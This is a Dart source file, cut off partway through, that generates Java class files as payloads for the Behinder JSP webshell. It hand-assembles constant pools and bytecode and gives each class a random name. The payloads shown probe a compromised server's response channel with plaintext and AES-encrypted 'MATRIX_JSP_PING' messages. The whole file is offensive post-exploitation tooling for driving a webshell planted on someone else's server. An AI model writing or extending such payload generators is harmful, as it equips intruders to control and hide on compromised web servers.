import 'dart:typed_data';

// NOTE: this file is platform-agnostic — no dart:io imports.
// The smoke test at the bottom is standalone; run with `dart run`.

/// Pure-Dart JVM class file generator — no javac, no ASM, no pre-compiled
/// templates required.
///
/// Ported from the approach in poc.py: builds a valid Java .class file from
/// scratch using handwritten constant-pool entries and bytecode instructions.
///
/// Generated classes follow the Behinder entry-point contract:
///   `public boolean equals(Object obj)` — called by the JSP webshell after
///   defineClass + newInstance, with the PageContext as the argument.

// ---------------------------------------------------------------------------
// JVM constants
// ---------------------------------------------------------------------------

const int _kMagic = 0xCAFEBABE;
const int _kMajorVersion = 49; // Java 5 — no StackMapTable; compatible with JDK 8+ defineClass
const int _kMinorVersion = 0;

// Constant-pool tags
const int _kUtf8 = 1;
const int _kInteger = 3;
const int _kClass = 7;
const int _kString = 8;
const int _kFieldref = 9;
const int _kMethodref = 10;
const int _kInterfaceMethodref = 11;
const int _kNameAndType = 12;

// Access flags
const int _kAccPublic = 0x0001;
const int _kAccSuper = 0x0020;

// Opcodes
const int _kAconstNull = 0x01;
const int _kIconstM1 = 0x02;
const int _kIconst0 = 0x03;
const int _kIconst5 = 0x08;
const int _kBipush = 0x10;
const int _kSipush = 0x11;
const int _kLdc = 0x12;
const int _kLdcW = 0x13;
const int _kIload = 0x15;
const int _kAload = 0x19;
const int _kIload0 = 0x1a;
const int _kAload0 = 0x2a;
const int _kAload1 = 0x2b;
const int _kAload2 = 0x2c;
const int _kAload3 = 0x2d;
const int _kAaload = 0x32;
const int _kIstore = 0x36;
const int _kAstore = 0x3a;
const int _kIstore0 = 0x3b;
const int _kAstore0 = 0x4b;
const int _kAstore1 = 0x4c;
const int _kAstore2 = 0x4d;
const int _kAstore3 = 0x4e;
const int _kPop = 0x57;
const int _kPop2 = 0x58;
const int _kDup = 0x59;
const int _kDupX1 = 0x5a;
const int _kSwap = 0x5f;
const int _kAnewarray = 0xbd;
const int _kAastore = 0x53;
const int _kArraylength = 0xbe;
const int _kAthrow = 0xbf;
const int _kCheckcast = 0xc0;
const int _kIfeq = 0x99;
const int _kIfne = 0x9a;
const int _kIflt = 0x9b;
const int _kIfIcmplt = 0xa1;
const int _kIfIcmpge = 0xa2;
const int _kGoto = 0xa7;
const int _kIfnull = 0xc6;
const int _kIfnonnull = 0xc7;
const int _kIreturn = 0xac;
const int _kReturn = 0xb1;
const int _kInvokevirtual = 0xb6;
const int _kInvokespecial = 0xb7;
const int _kInvokestatic = 0xb8;
const int _kInvokeinterface = 0xb9;
const int _kNew = 0xbb;
const int _kNewarray = 0xbc;

// Array type codes for newarray
const int _kTByte = 8;

// ---------------------------------------------------------------------------
// ByteData helpers — safe encoders that return Uint8List
// ---------------------------------------------------------------------------

Uint8List _b1(int tag, int v) {
  final d = ByteData(3);
  d.setUint8(0, tag);
  d.setUint16(1, v);
  return Uint8List.view(d.buffer);
}

Uint8List _b1i(int tag, int v) {
  final d = ByteData(5);
  d.setUint8(0, tag);
  d.setInt32(1, v);
  return Uint8List.view(d.buffer);
}

Uint8List _b2(int tag, int v1, int v2) {
  final d = ByteData(5);
  d.setUint8(0, tag);
  d.setUint16(1, v1);
  d.setUint16(3, v2);
  return Uint8List.view(d.buffer);
}

Uint8List _bUtf8(int tag, Uint8List body) {
  final d = ByteData(3 + body.length);
  d.setUint8(0, tag);
  d.setUint16(1, body.length);
  final r = Uint8List.view(d.buffer);
  r.setAll(3, body);
  return r;
}

// ---------------------------------------------------------------------------
// Constant-pool builder (auto-dedup)
// ---------------------------------------------------------------------------

class ConstantPool {
  final List<Uint8List> _entries = [];
  final Map<String, int> _cache = {};

  int get length => _entries.length + 1;

  int _add(String key, Uint8List Function() build) {
    final prev = _cache[key];
    if (prev != null) return prev;
    _entries.add(Uint8List(0)); // placeholder
    final idx = _entries.length;
    _cache[key] = idx;
    final raw = build();
    _entries[idx - 1] = raw;
    return idx;
  }

  int utf8(String s) {
    final b = _encodeModifiedUtf8(s);
    return _add('u:$s', () => _bUtf8(_kUtf8, b));
  }

  int integer(int v) {
    return _add('i:$v', () => _b1i(_kInteger, v));
  }

  int cls(String name) {
    return _add('c:$name', () => _b1(_kClass, utf8(name)));
  }

  int string(String s) {
    return _add('s:$s', () => _b1(_kString, utf8(s)));
  }

  int nat(String name, String desc) {
    return _add('n:$name:$desc', () => _b2(_kNameAndType, utf8(name), utf8(desc)));
  }

  int methodref(String clsName, String name, String desc) {
    return _add('m:$clsName.$name$desc',
        () => _b2(_kMethodref, cls(clsName), nat(name, desc)));
  }

  int interfaceMethodref(String clsName, String name, String desc) {
    return _add('im:$clsName.$name$desc',
        () => _b2(_kInterfaceMethodref, cls(clsName), nat(name, desc)));
  }

  int fieldref(String clsName, String name, String desc) {
    return _add('f:$clsName.$name$desc',
        () => _b2(_kFieldref, cls(clsName), nat(name, desc)));
  }

  Uint8List toBytes() {
    final buf = BytesBuilder(copy: false);
    final d = ByteData(2)..setUint16(0, length);
    buf.add(Uint8List.view(d.buffer));
    for (final e in _entries) {
      buf.add(e);
    }
    return buf.toBytes();
  }

  /// Modified UTF-8 encoding as required by the JVM.
  static Uint8List _encodeModifiedUtf8(String s) {
    final out = <int>[];
    for (var i = 0; i < s.length; i++) {
      final c = s.codeUnitAt(i);
      if (c == 0x0000) {
        out.addAll([0xC0, 0x80]);
      } else if (c <= 0x007F) {
        out.add(c);
      } else if (c <= 0x07FF) {
        out.add(0xC0 | (c >> 6));
        out.add(0x80 | (c & 0x3F));
      } else if (c >= 0xD800 && c <= 0xDBFF && i + 1 < s.length) {
        final lo = s.codeUnitAt(i + 1);
        if (lo >= 0xDC00 && lo <= 0xDFFF) {
          i++;
          final cp = 0x10000 + ((c - 0xD800) << 10) + (lo - 0xDC00);
          out.add(0xF0 | (cp >> 18));
          out.add(0x80 | ((cp >> 12) & 0x3F));
          out.add(0x80 | ((cp >> 6) & 0x3F));
          out.add(0x80 | (cp & 0x3F));
        } else {
          out.add(0xE0 | (c >> 12));
          out.add(0x80 | ((c >> 6) & 0x3F));
          out.add(0x80 | (c & 0x3F));
        }
      } else {
        out.add(0xE0 | (c >> 12));
        out.add(0x80 | ((c >> 6) & 0x3F));
        out.add(0x80 | (c & 0x3F));
      }
    }
    return Uint8List.fromList(out);
  }
}

// ---------------------------------------------------------------------------
// Bytecode writer — appends instructions, tracks stack / locals
// ---------------------------------------------------------------------------

class _CodeBuf {
  final List<int> _buf = [];
  int _maxStack = 0;
  int _curStack = 0;
  int _maxLocals = 0;
  final List<int> _patchPoints = [];

  Uint8List toBytes() => Uint8List.fromList(_buf);
  int get maxStack => _maxStack;
  int get maxLocals => _maxLocals;
  int get length => _buf.length;

  void _push(int n) {
    _curStack += n;
    if (_curStack > _maxStack) _maxStack = _curStack;
  }

  void _pop(int n) {
    _curStack -= n;
  }

  void _ensureLocal(int slot) {
    if (slot + 1 > _maxLocals) _maxLocals = slot + 1;
  }

  void _u1(int b) => _buf.add(b & 0xFF);
  void _u2(int v) {
    _buf.add((v >> 8) & 0xFF);
    _buf.add(v & 0xFF);
  }

  void _ldc(int cpIdx) {
    if (cpIdx <= 255) {
      _u1(_kLdc);
      _u1(cpIdx);
    } else {
      _u1(_kLdcW);
      _u2(cpIdx);
    }
  }

  void aconstNull() { _u1(_kAconstNull); _push(1); }

  void iconst(int v) {
    if (v == -1) {
      _u1(_kIconstM1);
    } else if (v >= 0 && v <= 5) {
      _u1(_kIconst0 + v);
    } else if (v >= -128 && v <= 127) {
      _u1(_kBipush);
      _u1(v);
    } else if (v >= -32768 && v <= 32767) {
      _u1(_kSipush);
      _u2(v);
    } else {
      ldc(v); // will fail at runtime, but better than crashing
      return;
    }
    _push(1);
  }

  void aload(int slot) {
    _ensureLocal(slot);
    if (slot <= 3) { _u1(_kAload0 + slot); } else { _u1(_kAload); _u1(slot); }
    _push(1);
  }

  void iload(int slot) {
    _ensureLocal(slot);
    if (slot <= 3) { _u1(_kIload0 + slot); } else { _u1(_kIload); _u1(slot); }
    _push(1);
  }

  void astore(int slot) {
    _ensureLocal(slot);
    if (slot <= 3) { _u1(_kAstore0 + slot); } else { _u1(_kAstore); _u1(slot); }
    _pop(1);
  }

  void istore(int slot) {
    _ensureLocal(slot);
    if (slot <= 3) { _u1(_kIstore0 + slot); } else { _u1(_kIstore); _u1(slot); }
    _pop(1);
  }

  void dup() { _u1(_kDup); _push(1); }
  void dupX1() { _u1(_kDupX1); _push(1); }
  void pop() { _u1(_kPop); _pop(1); }
  void pop2() { _u1(_kPop2); _pop(2); }
  void swap() { _u1(_kSwap); }

  void anewarray(int clsIdx) { _u1(_kAnewarray); _u2(clsIdx); _pop(1); _push(1); }
  void aastore() { _u1(_kAastore); _pop(3); }

  void newarray(int atype) { _u1(_kNewarray); _u1(atype); _pop(1); _push(1); }

  void new_(int clsIdx) { _u1(_kNew); _u2(clsIdx); _push(1); }
  void invokevirtual(int mIdx) { _u1(_kInvokevirtual); _u2(mIdx); }
  void invokespecial(int mIdx) { _u1(_kInvokespecial); _u2(mIdx); }
  void invokestatic(int mIdx) { _u1(_kInvokestatic); _u2(mIdx); }

  void ret() { _u1(_kReturn); }
  void ireturn() { _u1(_kIreturn); _pop(1); }
  void athrow() { _u1(_kAthrow); _pop(1); _push(1); }

  /// iinc slot const — increment local int by signed byte
  void iinc(int slot, int delta) {
    _u1(0x84); // iinc opcode
    _u1(slot);
    _u1(delta & 0xFF);
  }

  /// checkcast class
  void checkcast(int clsIdx) { _u1(_kCheckcast); _u2(clsIdx); }

  void invokeinterface(int mIdx, int count) {
    _u1(_kInvokeinterface);
    _u2(mIdx);
    _u1(count);
    _u1(0); // reserved
  }

  void i2l() { _u1(0x85); /* i2l: int→long, stack grows by 1 */ _push(1); }
  void lmul() { _u1(0x69); _pop(2); /* lmul: pops 2 longs (4 slots), pushes long (2 slots) */ }

  void arraylength() { _u1(_kArraylength); _pop(1); _push(1); }

  void iflt() { _branch(_kIflt, popCount: 1); }
  void ifIcmpge() {
    _u1(_kIfIcmpge);
    _pop(2);
    _patchPoints.add(_buf.length);
    _u2(0x0000);
  }

  void aaload() { _u1(_kAaload); _pop(2); _push(1); }

  void ldc(int cpIdx) { _ldc(cpIdx); _push(1); }

  int mark() => _buf.length;

  // Branch instructions — record patch point, return offset position
  int _branch(int opcode, {int popCount = 0}) {
    _u1(opcode);
    if (popCount > 0) _pop(popCount);
    final pos = _buf.length; // offset position (right after opcode)
    _patchPoints.add(pos);
    _u2(0x0000); // placeholder
    return pos;
  }

  void goto_() { _branch(_kGoto); }
  void ifnull() { _branch(_kIfnull, popCount: 1); }
  void ifnonnull() { _branch(_kIfnonnull, popCount: 1); }
  void ifeq() { _branch(_kIfeq, popCount: 1); }
  void ifne() { _branch(_kIfne, popCount: 1); }
  void ifIcmplt() { _branch(_kIfIcmplt, popCount: 2); }

  /// Emit a try-catch entry (start_pc, end_pc, handler_pc, catch_type_index).
  /// Returns bytes to be placed in the exception_table.
  static Uint8List exceptionEntry(
    int startPc, int endPc, int handlerPc, int catchType,
  ) {
    final d = ByteData(8);
    d.setUint16(0, startPc);
    d.setUint16(2, endPc);
    d.setUint16(4, handlerPc);
    d.setUint16(6, catchType);
    return Uint8List.view(d.buffer);
  }

  /// Patch all recorded branch offsets relative to current position.
  void patchHere() {
    final target = _buf.length;
    for (final pos in _patchPoints) {
      final branchStart = pos - 1; // opcode right before offset
      final offset = target - branchStart;
      _buf[pos] = (offset >> 8) & 0xFF;
      _buf[pos + 1] = offset & 0xFF;
    }
    _patchPoints.clear();
  }
}

// ---------------------------------------------------------------------------
// Method builder — wraps a Code attribute in a proper method_info
// ---------------------------------------------------------------------------

Uint8List _buildMethod(int accessFlags, int methodNameIdx, int methodDescIdx,
    int codeAttrNameIdx, _CodeBuf cb, List<Uint8List> exceptionTable) {
  final codeAttr = _codeAttr(codeAttrNameIdx, cb, exceptionTable);
  final hdr = ByteData(8)
    ..setUint16(0, accessFlags)
    ..setUint16(2, methodNameIdx)
    ..setUint16(4, methodDescIdx)
    ..setUint16(6, 1); // attributes_count = 1
  final out = BytesBuilder(copy: false);
  out.add(Uint8List.view(hdr.buffer));
  out.add(codeAttr);
  return out.toBytes();
}

Uint8List _codeAttr(int nameIdx, _CodeBuf cb, List<Uint8List> exceptionTable) {
  final code = cb.toBytes();
  final body = BytesBuilder(copy: false);

  final hdr = ByteData(8)
    ..setUint16(0, cb.maxStack)
    ..setUint16(2, cb.maxLocals)
    ..setUint32(4, code.length);
  body.add(Uint8List.view(hdr.buffer));
  body.add(code);

  // exception_table
  final etCount = ByteData(2)..setUint16(0, exceptionTable.length);
  body.add(Uint8List.view(etCount.buffer));
  for (final e in exceptionTable) {
    body.add(e);
  }

  // attributes_count = 0
  body.add(Uint8List(2));

  final rawBody = body.toBytes();
  final attr = ByteData(6)
    ..setUint16(0, nameIdx)
    ..setUint32(2, rawBody.length);
  final result = BytesBuilder(copy: false);
  result.add(Uint8List.view(attr.buffer));
  result.add(rawBody);
  return result.toBytes();
}

// ---------------------------------------------------------------------------
// Output type
// ---------------------------------------------------------------------------

class GeneratedPayload {
  final Uint8List classBytes;
  final String className;
  const GeneratedPayload({required this.classBytes, required this.className});
}

// ---------------------------------------------------------------------------
// BehinderPayloadFactory — generates action-specific payload classes
// ---------------------------------------------------------------------------

class BehinderPayloadFactory {
  final String key;
  BehinderPayloadFactory({required this.key});

  static String _randomClassName(String prefix) {
    final r = List.generate(8, (_) {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      return chars.codeUnitAt(
        (DateTime.now().microsecondsSinceEpoch ^
                (prefix.hashCode * 31 + _counter++)) %
            36,
      );
    });
    return '$prefix${String.fromCharCodes(r)}';
  }

  static int _counter = 0;

  // -----------------------------------------------------------------------
  // -----------------------------------------------------------------------
  // buildMinimal — trivial class: equals() just returns true
  // -----------------------------------------------------------------------
  GeneratedPayload buildMinimal() {
    final cp = ConstantPool();
    final rn = _randomClassName('Min');
    final codeU = cp.utf8('Code');

    final thisCls = cp.cls(rn);
    final objCls = cp.cls('java/lang/Object');
    final objInit = cp.methodref('java/lang/Object', '<init>', '()V');

    // equals: aload_1; pop; iconst_1; ireturn
    final eq = _CodeBuf();
    eq.aload(1);
    eq.pop();
    eq.iconst(1);
    eq.ireturn();
    final eqM = _buildMethod(_kAccPublic, cp.utf8('equals'),
        cp.utf8('(Ljava/lang/Object;)Z'), codeU, eq, []);

    final init = _CodeBuf();
    init.aload(0);
    init.invokespecial(objInit);
    init.ret();
    final initM = _buildMethod(_kAccPublic, cp.utf8('<init>'),
        cp.utf8('()V'), codeU, init, []);

    return _assemble(cp, thisCls, objCls, [initM, eqM], rn);
  }

  // -----------------------------------------------------------------------
  // buildDiag — diagnostic: get response, write "OK" plaintext, return true
  // -----------------------------------------------------------------------
  GeneratedPayload buildDiag() {
    final cp = ConstantPool();
    final rn = _randomClassName('Diag');
    final codeU = cp.utf8('Code');

    final thisCls = cp.cls(rn);
    final objCls = cp.cls('java/lang/Object');
    final objInit = cp.methodref('java/lang/Object', '<init>', '()V');

    final cb = _CodeBuf();

    // Get response from pageContext
    cb.aload(1);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getResponse'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(2); // response

    // Null check
    cb.aload(2);
    cb.ifnonnull();
    final jOk = cb.mark() - 2;
    cb.iconst(1);
    cb.ireturn();
    _patchPos(cb, jOk, cb.mark());

    // response.getWriter().print("OK") — via reflection
    cb.aload(2);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getWriter'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(2);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(3); // writer

    // writer.getClass().getMethod("print", String.class).invoke(writer, "OK")
    cb.aload(3);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('print'));
    cb.iconst(1);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.dup();
    cb.iconst(0);
    cb.ldc(cp.cls('java/lang/String'));
    cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(3);
    cb.iconst(1);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.dup();
    cb.iconst(0);
    cb.ldc(cp.string('OK'));
    cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.pop();

    // writer.getClass().getMethod("flush").invoke(writer)
    cb.aload(3);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('flush'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(3);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.pop();

    cb.iconst(1);
    cb.ireturn();

    final eqM = _buildMethod(_kAccPublic, cp.utf8('equals'),
        cp.utf8('(Ljava/lang/Object;)Z'), codeU, cb, []);

    final init = _CodeBuf();
    init.aload(0);
    init.invokespecial(objInit);
    init.ret();
    final initM = _buildMethod(_kAccPublic, cp.utf8('<init>'),
        cp.utf8('()V'), codeU, init, []);

    return _assemble(cp, thisCls, objCls, [initM, eqM], rn);
  }

  // -----------------------------------------------------------------------
  // buildPingNoCrypto — Ping but write JSON plaintext (no AES, for debugging)
  // -----------------------------------------------------------------------
  GeneratedPayload buildPingNoCrypto() {
    final cp = ConstantPool();
    final rn = _randomClassName('PNC');
    final codeU = cp.utf8('Code');

    final thisCls = cp.cls(rn);
    final objCls = cp.cls('java/lang/Object');
    final objInit = cp.methodref('java/lang/Object', '<init>', '()V');

    final cb = _CodeBuf();

    // Get response from pageContext
    cb.aload(1);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getResponse'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(2);

    cb.aload(2);
    cb.ifnonnull();
    final j1 = cb.mark() - 2;
    cb.iconst(1);
    cb.ireturn();
    _patchPos(cb, j1, cb.mark());

    // Write "PONG" as plaintext to getOutputStream
    cb.ldc(cp.string('MATRIX_JSP_PING'));
    cb.ldc(cp.string('UTF-8'));
    cb.invokevirtual(cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
    cb.astore(3);

    // response.getOutputStream().write(bytes).flush()
    _emitReflectiveCall(cb, cp, objSlot: 2, methodName: 'getOutputStream', argCount: 0);
    final osSlot = 4;
    cb.astore(osSlot);

    cb.aload(osSlot);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('write'));
    cb.iconst(1);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.dup();
    cb.iconst(0);
    cb.ldc(cp.cls('[B'));
    cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(osSlot);
    cb.iconst(1);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.dup();
    cb.iconst(0);
    cb.aload(3);
    cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.pop();

    cb.aload(osSlot);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('flush'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(osSlot);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.pop();

    cb.iconst(1);
    cb.ireturn();

    final eqM = _buildMethod(_kAccPublic, cp.utf8('equals'),
        cp.utf8('(Ljava/lang/Object;)Z'), codeU, cb, []);

    final init = _CodeBuf();
    init.aload(0);
    init.invokespecial(objInit);
    init.ret();
    final initM = _buildMethod(_kAccPublic, cp.utf8('<init>'),
        cp.utf8('()V'), codeU, init, []);

    return _assemble(cp, thisCls, objCls, [initM, eqM], rn);
  }

  // -----------------------------------------------------------------------
  // buildPingViaWriter — like PNC but uses getWriter().print()
  // -----------------------------------------------------------------------
  GeneratedPayload buildPingViaWriter() {
    final cp = ConstantPool();
    final rn = _randomClassName('PWV');
    final codeU = cp.utf8('Code');
    final thisCls = cp.cls(rn);
    final objCls = cp.cls('java/lang/Object');
    final objInit = cp.methodref('java/lang/Object', '<init>', '()V');
    final cb = _CodeBuf();

    // Get response
    cb.aload(1);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getResponse'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod', '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1); cb.iconst(0); cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke', '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(2);

    cb.aload(2); cb.ifnonnull(); final j1 = cb.mark() - 2;
    cb.iconst(1); cb.ireturn();
    _patchPos(cb, j1, cb.mark());

    // writer = response.getWriter()
    cb.aload(2);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getWriter'));
    cb.iconst(0); cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod', '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(2); cb.iconst(0); cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke', '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(3);

    // writer.print("MATRIX_JSP_PING")
    cb.aload(3);
    cb.invokevirtual(cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('print')); cb.iconst(1); cb.anewarray(cp.cls('java/lang/Class'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.cls('java/lang/String')); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod', '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(3); cb.iconst(1); cb.anewarray(cp.cls('java/lang/Object'));
    cb.dup(); cb.iconst(0); cb.ldc(cp.string('MATRIX_JSP_PING')); cb.aastore();
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke', '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.pop();

    cb.iconst(1); cb.ireturn();

    final eqM = _buildMethod(_kAccPublic, cp.utf8('equals'), cp.utf8('(Ljava/lang/Object;)Z'), codeU, cb, []);
    final init = _CodeBuf(); init.aload(0); init.invokespecial(objInit); init.ret();
    final initM = _buildMethod(_kAccPublic, cp.utf8('<init>'), cp.utf8('()V'), codeU, init, []);
    return _assemble(cp, thisCls, objCls, [initM, eqM], rn);
  }

  // -- helper: split large data across constant-pool entries -----------------

  /// Emit bytecode that builds a byte[] from [data], automatically splitting
  /// across multiple CONSTANT_String entries if the base64 encoding exceeds
  /// [_kMaxStrChars] characters.
  void _emitBuildByteArray(_CodeBuf cb, ConstantPool cp, Uint8List data) {
    final dataB64 = _b64encodeBytes(data);

    if (dataB64.length <= _kMaxStrChars) {
      // Single chunk — no concatenation needed
      cb.ldc(cp.string(dataB64));
      cb.invokestatic(cp.methodref('java/util/Base64', 'getDecoder',
          '()Ljava/util/Base64\$Decoder;'));
      cb.swap();
      cb.invokevirtual(cp.methodref('java/util/Base64\$Decoder', 'decode',
          '(Ljava/lang/String;)[B'));
      return;
    }

    // Multiple chunks: split base64 string, decode each, concatenate
    final chunks = <String>[];
    for (var i = 0; i < dataB64.length; i += _kMaxStrChars) {
      final end = (i + _kMaxStrChars).clamp(0, dataB64.length);
      chunks.add(dataB64.substring(i, end));
    }

    // bos = new ByteArrayOutputStream()
    cb.new_(cp.cls('java/io/ByteArrayOutputStream'));
    cb.dup();
    cb.invokespecial(cp.methodref(
        'java/io/ByteArrayOutputStream', '<init>', '()V'));
    final bosSlot = 20;
    cb.astore(bosSlot);

    for (final chunk in chunks) {
      // bos.write(Base64.getDecoder().decode(chunk))
      cb.aload(bosSlot);
      cb.ldc(cp.string(chunk));
      cb.invokestatic(cp.methodref('java/util/Base64', 'getDecoder',
          '()Ljava/util/Base64\$Decoder;'));
      cb.swap();
      cb.invokevirtual(cp.methodref('java/util/Base64\$Decoder', 'decode',
          '(Ljava/lang/String;)[B'));
      cb.invokevirtual(cp.methodref('java/io/ByteArrayOutputStream', 'write',
          '([B)V'));
    }

    // bos.toByteArray()
    cb.aload(bosSlot);
    cb.invokevirtual(cp.methodref(
        'java/io/ByteArrayOutputStream', 'toByteArray', '()[B'));
  }

  /// Base64-encode raw bytes → String (same alphabet as java.util.Base64).
  static String _b64encodeBytes(Uint8List bytes) {
    const alphabet =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    final out = StringBuffer();
    for (var i = 0; i < bytes.length; i += 3) {
      final a = bytes[i];
      final b = i + 1 < bytes.length ? bytes[i + 1] : 0;
      final c = i + 2 < bytes.length ? bytes[i + 2] : 0;
      out.write(alphabet[a >> 2]);
      out.write(alphabet[((a & 0x3) << 4) | (b >> 4)]);
      out.write(i + 1 < bytes.length ? alphabet[((b & 0xF) << 2) | (c >> 6)] : '=');
      out.write(i + 2 < bytes.length ? alphabet[c & 0x3F] : '=');
    }
    return out.toString();
  }

  // -----------------------------------------------------------------------
  // buildPing
  // -----------------------------------------------------------------------
  GeneratedPayload buildPing() {
    final cp = ConstantPool();
    final rn = _randomClassName('Ping');
    final codeU = cp.utf8('Code');

    final thisCls = cp.cls(rn);
    final objCls = cp.cls('java/lang/Object');
    final objInit = cp.methodref('java/lang/Object', '<init>', '()V');

    final cb = _CodeBuf();

    // response = pageContext.getClass().getMethod("getResponse").invoke(pageContext)
    cb.aload(1);
    cb.invokevirtual(
        cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
    cb.ldc(cp.string('getResponse'));
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Class'));
    cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
        '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
    cb.aload(1);
    cb.iconst(0);
    cb.anewarray(cp.cls('java/lang/Object'));
    cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
        '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
    cb.astore(2);

    cb.aload(2);
    cb.ifnonnull();
    final j1 = cb.mark() - 2;
    // null case: return true
    cb.iconst(1);
    cb.ireturn();
    // non-null case continues:
    _patchPos(cb, j1, cb.mark());

    // JSON string embedded directly
    final statusB64 = _b64('success');
    final msgB64 = _b64('MATRIX_JSP_PING');
    final json = '{"status":"$statusB64","msg":"$msgB64"}';
    cb.ldc(cp.string(json));
    cb.ldc(cp.string('UTF-8'));
    cb.invokevirtual(
        cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
    cb.astore(3);

    _emitAesEncryptB64Raw(cb, cp, key, plainSlot: 3, resultSlot: 4);
    _emitWriteResponse(cb, cp, responseSlot: 2, dataSlot: 4);

